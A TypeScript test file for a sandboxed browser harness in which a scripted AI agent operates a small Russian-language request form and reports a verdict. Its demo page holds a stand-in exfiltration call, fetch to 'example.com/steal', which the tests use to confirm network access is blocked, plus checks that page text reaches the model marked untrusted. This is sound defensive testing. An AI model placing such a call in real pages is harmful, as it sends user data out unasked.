import assert from 'node:assert/strict';
import { access } from 'node:fs/promises';
import { describe, it } from 'node:test';
import type { AgentMessage, AgentModel, AgentReply } from './agent-model.js';
import { findCaseTests } from './browser-case-runs.js';
import { runBrowserCases } from './browser-cases.js';

const CHROMIUM = process.env.CAPTURE_CHROMIUM_EXECUTABLE_PATH ?? '/opt/pw-browsers/chromium-1243/chrome-linux64/chrome';
const browserReady = await access(CHROMIUM).then(() => true, () => false);

// A tiny preview: a role switcher, a form and a list; it also tries the network, which must be refused.
const DEMO = `<!doctype html><html><body>
<div>Демо · роль: <select id="role"><option>Клиент</option><option>Мастер</option></select></div>
<label>Описание <input id="text"></label><button id="add">Создать заявку</button>
<ul id="list"></ul><p id="net">сеть: ждём</p>
<script>
document.getElementById('add').onclick = () => { const v = document.getElementById('text').value.trim(); if (!v) { alert; document.getElementById('list').insertAdjacentHTML('beforeend', '<li>Ошибка: опишите заявку</li>'); return; } document.getElementById('list').insertAdjacentHTML('beforeend', '<li>Заявка: ' + v + '</li>'); };
fetch('https://example.com/steal').then(() => { document.getElementById('net').textContent = 'сеть: УТЕЧКА'; }, () => { document.getElementById('net').textContent = 'сеть: закрыта'; });
</script></body></html>`;

/** A scripted model: the moves a tester would make, reading the screen the tool returned. */
function scripted(moves: Array<(seen: string) => { name: string; args: Record<string, unknown> }>): AgentModel & { seen: string[] } {
  let step = 0;
  const seen: string[] = [];
  return {
    name: 'scripted', model: 'scripted', seen,
    async next(messages: AgentMessage[]): Promise<AgentReply> {
      const last = messages[messages.length - 1];
      const screen = last && last.role === 'tool' ? last.content : '';
      seen.push(screen);
      const move = moves[step++]!(screen);
      return { text: null, toolCalls: [{ id: `t${step}`, name: move.name, arguments: JSON.stringify(move.args) }], usage: { inputTokens: 100, outputTokens: 20 } };
    },
  };
}
const idOf = (screen: string, label: string) => Number(new RegExp(`\\[(\\d+)\\][^\\n]*${label}`).exec(screen)![1]);

describe('AI agent in the browser on the preview', () => {
  it('looks, types, presses and reports what it saw; the page cannot reach the network', { skip: browserReady ? false : 'no Chromium' }, async () => {
    const model = scripted([
      () => ({ name: 'look', args: {} }),
      (screen) => ({ name: 'fill', args: { id: idOf(screen, 'Описание'), text: 'Не греет бойлер' } }),
      () => ({ name: 'look', args: {} }),
      (screen) => ({ name: 'click', args: { id: idOf(screen, 'Создать заявку') } }),
      () => ({ name: 'look', args: {} }),
      (screen) => ({ name: 'verdict', args: { result: screen.includes('Заявка: Не греет бойлер') ? 'passed' : 'failed', observed: 'Заявка появилась в списке.' } }),
    ]);
    const outcome = await runBrowserCases({
      html: DEMO, model, language: 'Russian', executablePath: CHROMIUM, maxCostTiyn: 1000, roleName: () => 'Клиент', costOf: () => 1,
      cases: [{ key: 'c1', title: 'Клиент создаёт заявку', actor: 'client', honest: true, given: 'Клиент вошёл', steps: ['Описывает проблему', 'Нажимает «Создать заявку»'], expected: 'Заявка в списке', mustNot: '' }],
    });
    assert.deepEqual(outcome.results, [{ key: 'c1', status: 'passed', observed: 'Заявка появилась в списке.', turns: 6 }]);
    assert.equal(outcome.costTiyn, 6);
    assert.ok(model.seen.some((screen) => screen.includes('сеть: закрыта')));
    assert.ok(!model.seen.some((screen) => screen.includes('УТЕЧКА')));
    // The screen reaches the model marked as untrusted, with numbered controls.
    assert.match(model.seen[1]!, /SCREEN TEXT \(untrusted\)/);
    assert.match(model.seen[1]!, /\[\d+\] select \[Клиент \| Мастер\]/);
  });

  it('no verdict within the turns is «cannot check», never a pass', { skip: browserReady ? false : 'no Chromium' }, async () => {
    const model = scripted(Array.from({ length: 20 }, () => () => ({ name: 'look', args: {} })));
    const outcome = await runBrowserCases({ html: DEMO, model, language: 'Russian', executablePath: CHROMIUM, maxCostTiyn: 1000, roleName: () => '—', costOf: () => 0,
      cases: [{ key: 'c2', title: 'x', actor: null, honest: true, given: '', steps: ['x'], expected: 'y', mustNot: '' }] });
    assert.equal(outcome.results[0]!.status, 'cannot_check');
  });

  it('finds the agent\'s test behind a case', () => {
    const files = [
      { path: 'test/rules.test.js', content: ['import test from "node:test";', '', '// [case:c9] is in a comment only', 'test("[case:c3] staff cannot delete", async () => {', '  const res = await api.delete("/api/request/1", staff);', '  assert.equal(res.status, 403);', '});', '', 'test("[case:c4] x", () => assert.ok(true));'].join('\n') },
      { path: 'src/app.js', content: 'const s = "[case:c3]";' },
    ];
    assert.deepEqual(findCaseTests(files, 'c3'), [{ path: 'test/rules.test.js', line: 4, code: 'test("[case:c3] staff cannot delete", async () => {\n  const res = await api.delete("/api/request/1", staff);\n  assert.equal(res.status, 403);\n});' }]);
    assert.equal(findCaseTests(files, 'c4')[0]!.code, 'test("[case:c4] x", () => assert.ok(true));');
    assert.deepEqual(findCaseTests(files, 'c9'), []);
  });
});
